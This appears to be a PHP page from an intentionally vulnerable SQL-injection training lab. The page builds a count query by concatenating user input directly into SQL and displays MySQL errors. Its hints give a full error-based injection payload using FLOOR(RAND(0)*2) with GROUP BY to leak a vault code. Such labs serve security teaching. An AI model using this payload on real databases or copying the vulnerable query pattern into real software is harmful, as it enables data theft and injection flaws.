<?php
require_once __DIR__ . '/../../includes/db.php';

$mode = $_GET['mode'] ?? 'black';
$verify_error = null;

/* =====================
   VAULT CODE VERIFY
===================== */
if (isset($_POST['admin_password'])) {
    $submitted = $_POST['admin_password'];

    $res = mysqli_query(
        $conn,
        "SELECT vault_code FROM vault LIMIT 1"
    );
    $row = mysqli_fetch_assoc($res);

    if ($row && $submitted === $row['vault_code']) {
        $_SESSION['mysql_lab6_solved'] = true;
        header("Location: " . url_lab_from_slug("mysql/lab6", $mode));
        exit;
    } else {
        $verify_error = "Incorrect. Keep trying!";
    }
}
?>

<!-- Lab Description -->
<div class="card">
    <h3>Lab 6. Error-Based: Floor + GROUP BY (Double Query)</h3>

    <h4>Scenario</h4>
    <p>
        A banking application lets customers look up how many accounts exist
        for a given type (savings, checking, investment). The page only shows
        <strong>&ldquo;X accounts found&rdquo;</strong>: no actual account data is
        displayed. However, a secret <code>vault</code> table holds a classified
        vault code. MySQL errors are shown on the page.
    </p>

    <h4>Objective</h4>
    <p>
        Use the classic <strong>FLOOR(RAND(0)*2) + GROUP BY</strong> double-query technique
        to force a &ldquo;Duplicate entry&rdquo; error that leaks the <strong>vault_code</strong>
        from the <code>vault</code> table. Submit it below.
    </p>

    <h4>Hints</h4>
    <span class="hint-toggle" data-hint="hint1">&#128161; Click for hints</span>
    <div id="hint1" class="hint-content">
        1. Try a single quote <code>'</code>: does it trigger an error?<br>
        2. The FLOOR/RAND/GROUP BY trick creates a non-deterministic grouping key that causes a duplicate key error.<br>
        3. The error message contains the value of your injected subquery.<br>
        4. Try: <code>' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT vault_code FROM vault LIMIT 1), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) -- -</code><br>
        5. The error will say: <code>Duplicate entry 'FLAG{...}:1' for key ...</code>
    </div>
</div>

<!-- Verify Flag -->
<div class="card">
    <h4>Submit Vault Code</h4>
    <form method="POST" class="form-row">
        <input type="text" name="admin_password" class="input" placeholder="Enter the vault code..." required>
        <button type="submit" class="btn btn-primary">Verify</button>
    </form>

    <?php if ($verify_error): ?>
        <div class="result-error result-box"><?= htmlspecialchars($verify_error) ?></div>
    <?php endif; ?>
</div>

<!-- Solved Banner -->
<?php if (!empty($_SESSION['mysql_lab6_solved'])): ?>

<div class="solved-banner">
    <span class="solved-icon">&#127942;</span>
    <div>
        <div class="solved-title">Lab Solved!</div>
        <div class="solved-desc">You successfully extracted the vault code using the FLOOR/RAND/GROUP BY double-query error technique.</div>
    </div>
</div>

<?php else: ?>

<!-- Vulnerable Query Interface -->
<div class="card">
    <h4>Account Type Lookup</h4>
    <form method="POST" class="form-row">
<input type="text" name="type" class="input" placeholder="Enter account type (try: savings)" value="<?= htmlspecialchars($_POST['type'] ?? '') ?>">
        <button type="submit" class="btn btn-primary">Lookup</button>
    </form>
</div>

<?php
if (isset($_POST['type'])) {
    $type = $_POST['type'];

    // INTENTIONALLY VULNERABLE: direct string concatenation
    $query = "SELECT count(*) AS total FROM accounts WHERE account_type = '$type'";

    // Show the executed query in a terminal block
    echo '<div class="terminal">';
    echo '  <div class="terminal-header">';
    echo '    <span class="terminal-dot red"></span>';
    echo '    <span class="terminal-dot yellow"></span>';
    echo '    <span class="terminal-dot green"></span>';
    echo '    <span class="terminal-title">MySQL Query</span>';
    echo '  </div>';
    echo '  <div class="terminal-body" data-highlight="sql">';
    echo '    <span class="prompt">mysql&gt; </span>' . htmlspecialchars($query);
    echo '  </div>';
    echo '</div>';

    // Execute: error-based: only show count, NOT actual data
    try {
        $result = mysqli_query($conn, $query);

        if ($result) {
            $row = mysqli_fetch_assoc($result);
            $count = $row['total'] ?? 0;
            if ($count > 0) {
                echo '<div class="result-success result-box"><strong>' . htmlspecialchars($count) . ' account(s) found</strong> for type &ldquo;' . htmlspecialchars($type) . '&rdquo;.</div>';
            } else {
                echo '<div class="result-warning result-box">No accounts found for type &ldquo;' . htmlspecialchars($type) . '&rdquo;.</div>';
            }
        }
    } catch (mysqli_sql_exception $e) {
        echo '<div class="result-error result-box">';
        echo '<strong>MySQL Error:</strong><br>' . htmlspecialchars($e->getMessage());
        echo '</div>';
    }
}
?>

<?php endif; ?>
